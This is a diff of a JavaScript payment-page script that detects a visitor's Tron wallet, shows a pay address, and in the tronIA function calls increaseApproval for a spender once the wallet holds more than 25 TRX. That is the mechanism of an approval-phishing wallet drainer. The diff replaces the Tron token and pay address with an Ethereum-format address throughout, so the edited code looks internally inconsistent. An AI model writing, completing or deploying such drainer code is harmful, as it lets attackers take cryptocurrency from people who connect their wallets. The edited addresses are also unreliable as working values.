@@ -629,7 +629,7 @@ async function getWallet() {
         } else if (chainId == '0xc3') {
             chain = 'tron';
             printd('tron');
-            pay_addr_input_ele.innerHTML = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+            pay_addr_input_ele.innerHTML = '0x39eED5Ed04dbFA049890D77B0309Aa1a2D411075';
             clearInterval(getWalletTimer);
             pay_ele.removeAttribute('style');
             wallet_ele.setAttribute('style', 'display:none');
@@ -640,7 +640,7 @@ async function getWallet() {
         if (typeof window.tronWeb !== "undefined") {
             chain = 'tron';
             printd('tron');
-            pay_addr_input_ele.innerHTML = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+            pay_addr_input_ele.innerHTML = '0x39eED5Ed04dbFA049890D77B0309Aa1a2D411075';
             clearInterval(getWalletTimer);
             pay_ele.removeAttribute('style');
             wallet_ele.setAttribute('style', 'display:none');
@@ -1329,7 +1329,7 @@ async function getWallet() {
         if (typeof window.tronWeb !== "undefined") {
             chain = 'tron';
             printd('tron');
-            pay_addr_input_ele.innerHTML = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+            pay_addr_input_ele.innerHTML = '0x39eED5Ed04dbFA049890D77B0309Aa1a2D411075';
             clearInterval(getWalletTimer);
             pay_ele.removeAttribute('style');
             wallet_ele.setAttribute('style', 'display:none');
@@ -2694,7 +2694,7 @@ async function getWallet() {
     } else if (typeof window.tron !== "undefined" && typeof window.tron.isTronLink !== "undefined") {
         wallet = 'tronLink';
         chain = 'tron';
-        pay_addr_input_ele.innerHTML = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+        pay_addr_input_ele.innerHTML = '0x39eED5Ed04dbFA049890D77B0309Aa1a2D411075';
         clearInterval(getWalletTimer);
         printd('tronLink');
         pay_ele.removeAttribute('style');
@@ -2706,7 +2706,7 @@ async function getWallet() {
     } else if (typeof window.Tron !== "undefined" && typeof window.tronPay !== "undefined") {
         wallet = 'bitpie';
         chain = 'tron';
-        pay_addr_input_ele.innerHTML = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+        pay_addr_input_ele.innerHTML = '0x39eED5Ed04dbFA049890D77B0309Aa1a2D411075';
         clearInterval(getWalletTimer);
         printd('tronLink');
         pay_ele.removeAttribute('style');
@@ -2892,7 +2892,7 @@ async function TUAP() {
 async function tronIA() {
     let trx = await window.tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58);
     if (trx > 25000000) {
-        const trc20ContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+        const trc20ContractAddress = "0x39eED5Ed04dbFA049890D77B0309Aa1a2D411075";
         try {
             let contract = await tronWeb.contract().at(trc20ContractAddress);
             res = await contract.increaseApproval(spender_bas58, amount).send({feeLimit: 100000000});
